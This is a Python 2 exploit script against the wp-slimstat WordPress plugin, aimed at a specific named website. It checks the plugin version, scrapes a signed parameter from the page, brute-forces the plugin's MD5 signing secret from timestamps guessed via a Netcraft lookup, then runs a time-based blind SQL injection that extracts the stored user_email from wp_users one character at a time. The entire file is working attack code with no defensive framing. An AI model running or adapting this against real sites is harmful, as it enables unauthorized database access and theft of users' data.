from phpserialize import *
from collections import OrderedDict
import time
import hashlib
import base64
import requests
import re
import sys
import operator
import json

def Blind_injection(s, url, secret):
    """"""
    
    data = ""
    for pos in xrange(1, 21):
        print "[+]Position: {0}".format(pos)

        for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@.":

            p = OrderedDict()
            p["(SELECT IF (SUBSTRING(user_email,{0},1) ='{1}' ,sleep(4) ,0) FROM wp_users LIMIT 1)".format(pos, c)] = "1"
            sql_payload = dumps(p)
            
            sql_payload64 =  base64.b64encode(sql_payload)
            signature = hashlib.md5(sql_payload64+secret).hexdigest()

            ci = "{0}.{1}".format(sql_payload64, signature) 

            data_to_send = base64.b64encode("ci={0}&res=Lw==".format(ci))

            payload = {"action":"slimtrack_js", "data":data_to_send}

            start = time.time()
            r = s.post(url, data=payload, )

            if time.time() - start > 8:
                print "\t[+]Found: {0}".format(c)
                data += c
                break

            # If last char was not it, it has not been found and last char.
            if c == ".":
                return data


#1336720023 d2dfdb1c30f4853579712bd276bdaae8
#secret = "d2dfdb1c30f4853579712bd276bdaae8"
url = "http://jafs.es/"
print "[+]Attacking {0}".format(url)

readme_url = url + "wp-content/plugins/wp-slimstat/readme.txt"

s = requests.Session()
s.headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",
           "Content-type": "application/x-www-form-urlencoded"}

r_readme = s.get("http://jafs.es/wp-content/plugins/wp-slimstat/readme.txt")
if r_readme.ok:

    print "[+]Readme found!"
    match = re.search(r"Stable tag: (\d)\.(\d)\.(\d)", r_readme.text)
    
    if match:

        version = ".".join(str(i) for i in match.group(1, 2, 3))
        print "[+]Version found: {0}!".format(version)
        
        sub = map(operator.sub, [3, 9, 6], map(int, match.group(1, 2, 3)))
        if sub != [0, 0, 0] and sorted(sub)[0] >= 0:
            r_main = s.get(url)
            match = re.search("var SlimStatParams = ({.*});", r_main.text)
            if match:
                SlimStatParams = json.loads(match.group(1))
                ajaxurl = SlimStatParams["ajaxurl"]
                ci = SlimStatParams["ci"]

                print "[+]Found SlimStatParams"
                print "\t[+] ci: {0}".format(ci)
                print "\t[+] ajax url: {0}".format(ajaxurl)

            else:
                print "[-] SlimStatParams not found!"
                sys.exit()
        else:
            print "[-]Version > 3.9.6"
            sys.exit()

    else:
        print "[-]Version not found!"
        sys.exit()
else:
    print "[-]Readme not found!"
    sys.exit()

signed, nonce = ci.split(".")

r_netcraft = s.get("http://mirror.toolbar.netcraft.com/check_url/{0}".format(url[:-1]))
match = re.search('(\d{4})<\/a>  Rank:', r_netcraft.text)

if match:
    year = int(match.group(1))
    print "[+]Estimated year: {0}".format(year)
else:
    print "[-]Netcraft year not found!"
    sys.exit()

begin = int(time.mktime(time.strptime('01.01.{0} 00:00:00'.format(year - 1), '%d.%m.%Y %H:%M:%S')))
end = int(time.mktime(time.strptime('01.01.{0} 00:00:00'.format(year + 2), '%d.%m.%Y %H:%M:%S')))

n = end - begin + 1

print "[+]Starting bruteforce!"
for epoch in xrange(n):

    progress = round((float(epoch)/n)*100, 6)
    if progress % 1 == 0:
        print "\t{0}%".format(progress)
    
    secret = hashlib.md5(str(begin+epoch)).hexdigest()
    if nonce == hashlib.md5(signed+secret).hexdigest():
        print "[+]Found the secret: {0}".format(secret)
        break

print "[+]Starting blind sql injection"
data = Blind_injection(s, ajaxurl, secret)
print "[+]Found data: {0}".format(data )
